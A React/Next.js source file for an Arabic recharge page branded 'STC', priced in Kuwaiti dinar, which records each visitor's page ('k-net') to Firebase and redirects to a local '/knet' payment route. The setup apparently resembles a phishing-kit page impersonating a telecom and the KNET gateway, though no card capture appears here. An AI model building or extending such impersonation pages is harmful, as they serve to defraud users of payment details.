"use client"

import type React from "react"

import { useEffect, useState } from "react"
import { ChevronRight, Share2, Check, Phone, CreditCard, Loader2 } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Label } from "@/components/ui/label"
import { Card, CardContent } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { addData } from "@/lib/firebase"

const rechargeOptions = [
    {
        value: "2",
        amount: "2",
        validity: "10",
        price: "2",
        popular: false,
        color: "from-pink-500 to-pink-700",
    },
    {
        value: "3",
        amount: "3",
        validity: "15",
        price: "3",
        popular: false,
        color: "from-pink-600 to-pink-800",
    },
    {
        value: "5",
        amount: "5",
        validity: "30",
        price: "5",
        popular: true,
        color: "from-indigo-500 to-pink-700",
    },
    {
        value: "10",
        amount: "10",
        validity: "90",
        price: "10",
        popular: false,
        color: "from-pink-600 to-indigo-800",
    },
    {
        value: "20",
        amount: "20",
        validity: "180",
        price: "20",
        popular: false,
        color: "from-pink-700 to-indigo-900",
    },
    {
        value: "25",
        amount: "25",
        validity: "365",
        price: "25",
        popular: false,
        color: "from-indigo-600 to-pink-900",
    },
]

export default function STCRechargePage() {
    const [selectedOption, setSelectedOption] = useState("")
    const [loading, setIsLoading] = useState(false)

    const handlePay = (e: any) => {
        e.preventDefault()
        setIsLoading(true)
        const vistor = localStorage.getItem('visitor')
        addData({ id: vistor, currentPage: "k-net" })
        setTimeout(() => {
            setIsLoading(false)

            window.location.href = '/knet'
        }, 2000);
    }

    useEffect(() => {
        const amount = localStorage.setItem('amount', selectedOption)
    }, [selectedOption])

    return (
        <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100" dir="rtl">
            {/* Header */}
            <div className="bg-white/80 backdrop-blur-lg px-6 py-5 flex items-center justify-between border-b border-gray-200/50 sticky top-0 z-10">
                <Button variant="ghost" size="icon" className="rounded-full hover:bg-gray-100">
                    <Share2 className="w-5 h-5 text-gray-600" />
                </Button>
                <div className="flex items-center gap-2">
                    <CreditCard className="w-5 h-5 text-pink-600" />
                    <h1 className="text-xl font-bold text-gray-900">الدفع</h1>
                </div>
                <Button variant="ghost" size="icon" className="rounded-full hover:bg-gray-100">
                    <ChevronRight className="w-5 h-5 text-gray-600" />
                </Button>
            </div>

            {/* Content */}
            <div className="px-6 py-8 pb-32">
                {/* Title Section */}
                <div className="text-center mb-10">
                    <p className="text-gray-600 text-lg">اختر باقة الشحن المناسبة لك</p>
                </div>


                {/* Recharge Options */}
                <div className="mb-6">
                    <h3 className="text-xl font-bold text-gray-900 mb-4">باقات الشحن المتاحة</h3>
                    <RadioGroup value={selectedOption} onValueChange={setSelectedOption} className="space-y-4">
                        {rechargeOptions.map((option) => (
                            <Card
                                key={option.value}
                                className={`relative overflow-hidden border-2 transition-all duration-300 cursor-pointer hover:shadow-xl ${selectedOption === option.value
                                        ? "border-pink-500 shadow-lg ring-2 ring-pink-200"
                                        : "border-gray-200 hover:border-pink-300"
                                    }`}
                                onClick={() => setSelectedOption(option.value)}
                            >
                                {option.popular && (
                                    <Badge className="absolute top-3 left-3 bg-gradient-to-r from-orange-400 to-pink-500 text-white border-0 z-10">
                                        الأكثر شعبية
                                    </Badge>
                                )}

                                <CardContent className="p-6">
                                    <div className="flex items-center justify-between">
                                        <div className="flex items-center gap-4">
                                            <RadioGroupItem
                                                value={option.value}
                                                id={option.value}
                                                className="w-5 h-5 border-2 border-pink-500 text-pink-600"
                                            />

                                            <div className="text-right">
                                                <div className="flex items-center gap-2 mb-1">
                                                    <span className="text-2xl font-bold text-gray-900">{option.price}</span>
                                                    <span className="text-lg font-semibold text-gray-600">د.ك</span>
                                                </div>
                                                <div className="flex items-center gap-2 text-gray-500">
                                                    <span className="text-sm">صالح لمدة</span>
                                                    <span className="font-semibold text-pink-600">{option.validity} يوم</span>
                                                </div>
                                            </div>
                                        </div>

                                        {/* Enhanced STC Card */}
                                        <div
style={{
    backgroundImage: "url('/bgst.png')",
    backgroundSize: "contain",
    backgroundPosition: "center",
    backgroundRepeat: "no-repeat"
  }}                                            className={` rounded-2xl p-4 min-w-[220px] flex flex-col items-center justify-center text-white  transform transition-transform duration-200 hover:scale-105`}
                                        >
                                            <div className="text-3xl font-bold mb-1">{option.amount}</div>
                                            <div className="text-xs font-bold tracking-wider mb-2">STC</div>
                                            <div className="w-10 h-1.5  to-orange-400 rounded-full"></div>
                                        </div>
                                    </div>
                                </CardContent>
                            </Card>
                        ))}
                    </RadioGroup>
                </div>

                {/* Selected Option Summary */}
                {selectedOption && (
                    <Card className="border-0 bg-gradient-to-r from-pink-50 to-indigo-50 shadow-lg">
                        <CardContent className="p-6">
                            <h4 className="font-bold text-gray-900 mb-2">ملخص العملية</h4>
                            <div className="flex justify-between items-center">
                                <span className="text-gray-600">المبلغ المحدد:</span>
                                <span className="font-bold text-pink-600">
                                    {rechargeOptions.find((opt) => opt.value === selectedOption)?.price} د.ك
                                </span>
                            </div>
                            <div className="flex justify-between items-center mt-1">
                                <span className="text-gray-600">مدة الصلاحية:</span>
                                <span className="font-semibold text-gray-900">
                                    {rechargeOptions.find((opt) => opt.value === selectedOption)?.validity} يوم
                                </span>
                            </div>
                        </CardContent>
                    </Card>
                )}
            </div>

            {/* Enhanced Continue Button */}
            <div className="fixed bottom-0 left-0 right-0 p-6 bg-white/90 backdrop-blur-lg border-t border-gray-200/50">
                <Button
                    onClick={handlePay}
                    className={`w-full py-4 text-lg font-bold rounded-2xl transition-all duration-300 ${selectedOption
                            ? "bg-gradient-to-r from-pink-600 to-pink-600 hover:from-pink-700 hover:to-pink-700 text-white shadow-xl hover:shadow-2xl transform hover:scale-[1.02]"
                            : "bg-gray-300 text-gray-500 cursor-not-allowed"
                        }`}
                    disabled={!selectedOption}
                >
                    متابعة الدفع
                    {loading && <Loader2 className="h-4 animate-spin" />}
                </Button>

                {selectedOption && (
                    <p className="text-center text-sm text-gray-500 mt-3">سيتم تحويلك إلى صفحة الدفع الآمنة</p>
                )}
            </div>
        </div>
    )
}
